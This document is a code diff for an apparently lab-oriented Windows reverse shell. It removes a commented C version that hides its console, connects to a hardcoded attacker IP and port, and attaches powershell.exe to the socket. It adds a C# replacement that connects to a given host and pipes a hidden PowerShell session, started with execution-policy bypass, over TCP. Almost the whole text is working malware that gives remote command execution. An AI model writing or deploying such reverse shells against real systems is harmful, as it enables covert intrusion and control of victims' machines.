@@ -3,90 +3,77 @@
 
 
 x86_64-w64-mingw32-gcc -o s2.exe shell2.c -lws2_32
+using System;
+using System.IO;
+using System.Net.Sockets;
+using System.Diagnostics;
 
-#include <winsock2.h>
-#include <windows.h> // Import for the Windows API 
-#include <stdio.h> // Standard input / output functions
-#include <string.h>
+namespace RShell
+{
+    internal class Program
+    {
+        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it
 
-#pragma comment(lib, "ws2_32.lib")
+        static void Main(string[] args)
+        {
+            // Check for correct number of arguments
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Usage: RShell.exe <IP> <Port>");
+                return;
+            }
 
-#define REV_IP "10.10.16.51"
-#define REV_PORT 4244
+            try
+            {
+                // Connect to <IP> on <Port>/TCP
+                TcpClient client = new TcpClient();
+                client.Connect(args[0], int.Parse(args[1]));
 
-int main() {
-    // hide window
-    HWND console;
-    AllocConsole();
-    console = FindWindowA("consoleWindowClass", NULL);
-    ShowWindow(console, SW_HIDE);
+                // Set up input/output streams
+                Stream stream = client.GetStream();
+                StreamReader streamReader = new StreamReader(stream);
+                streamWriter = new StreamWriter(stream);
 
+                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
+                Process p = new Process();
+                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+                p.StartInfo.Arguments = "-ep bypass -nologo";
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.RedirectStandardError = true;
+                p.StartInfo.RedirectStandardInput = true;
+                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
+                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);
 
-    printf("Reverse Shell attempt #1");
-    WSADATA socketdata; // Unsure : This stores info about the socket but is empty until we use WSAStartup()
+                // Start process and begin reading output
+                p.Start();
+                p.BeginOutputReadLine();
+                p.BeginErrorReadLine();
 
-    WSAStartup(MAKEWORD(2,2), &socketdata);
-    /*
-    WSAStartup() -> Call to initialize the WinSock system (kinda like turning on power before using power tool)
-    MAKEWORD(2,2) -> Asks for version 2.2 of WinSock
-    &socketdata -> "pointer" (define pointer TODO) to the previously created variable to store the socket data in it    
-    */
+                // Re-route user-input to STDIN of the PowerShell process
+                // If we see the user sent "exit", we can stop
+                string userInput = "";
+                while (!userInput.Equals("exit"))
+                {
+                    userInput = streamReader.ReadLine();
+                    p.StandardInput.WriteLine(userInput);
+                }
 
-    // Now we can start to create an actual socket, For this we can use the "WSASocketA()" function
-    SOCKET socketN1 = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-
-    /*
-    First we put the function in a variable (socketN1) because :
-    -> The function (WSASocketA) returns a value
-    -> It allows for error checking depending on the value
-    -> And since it's in a variable we can check for it in a "if" statement later
-
-    WSASocketA(
-    AF_INET, -> "Address Family INET" specifies that the socket will use the IPv4 address family, AF_INET6 for IPv6
-    SOCK_STREAM, -> Indicates that the socket is a stream socket (connexion data transfer, little bit like TCP)
-    IPPROTO_TCP, -> Specifies to use the TCP protocol
-    NULL, -> By passing NULL, you are instructing Winsock to use the first available transport provider that supports the requested combination of address family (AF_INET), socket type (SOCK_STREAM), and protocol (IPPROTO_TCP).
-    NULL, -> Passing NULL indicates that the socket will not belong to an existing socket group, nor will a new group be created
-    NULL, -> Passing NULL indicates that you want to use a non-overlapped socket
-    );
-    
-    */
-    // Basic error check :
-    if (socketN1 == INVALID_SOCKET) {
-        printf("[!] - Something Went wrong during socket creation: %d\n",WSAGetLastError());
+                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
+                p.WaitForExit();
+                client.Close();
+            }
+            catch (Exception) { }
+        }
+        
+        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
+        {
+            if (e.Data != null)
+            {
+                streamWriter.WriteLine(e.Data);
+                streamWriter.Flush();
+            }
+        }
     }
-    // Initialize the structure 
-    struct sockaddr_in connectionaddress;
-    char* attacker_IP = REV_IP;
-    short attacker_PORT = REV_PORT;
-
-    connectionaddress.sin_family = AF_INET; // Indicate that we are using IPv4
-    connectionaddress.sin_addr.s_addr = inet_addr(attacker_IP); // Convert and store the attacker’s IP address (in network byte order) in the struct
-    connectionaddress.sin_port = htons(attacker_PORT); // Convert the port to network byte order and store it in the struct
-    // Connect to the attacker's machine
-    if (connect(socketN1, (struct sockaddr*)&connectionaddress, sizeof(connectionaddress)) == SOCKET_ERROR) {
-        printf("[!] - Connection failed: %d\n", WSAGetLastError());
-        closesocket(socketN1);
-        WSACleanup();
-        return 1;
-    }
-    STARTUPINFOA startupInformation;
-    HANDLE Sockethandle = (HANDLE)socketN1;
-
-    memset(&startupInformation, 0, sizeof(startupInformation));
-    startupInformation.cb = sizeof(startupInformation);
-    startupInformation.dwFlags = STARTF_USESTDHANDLES;
-    startupInformation.hStdError = startupInformation.hStdInput = startupInformation.hStdOutput = Sockethandle;
-
-    PROCESS_INFORMATION processInformation;
-
-    // Create the process (powershell.exe)
-    if (CreateProcessA(NULL, "powershell.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation)) {
-        printf("Process created successfully. PID: %d\n", processInformation.dwProcessId);
-    } else {
-        printf("Error creating process: %d\n", GetLastError());
-    }
-    
-
-    return 0;
 }
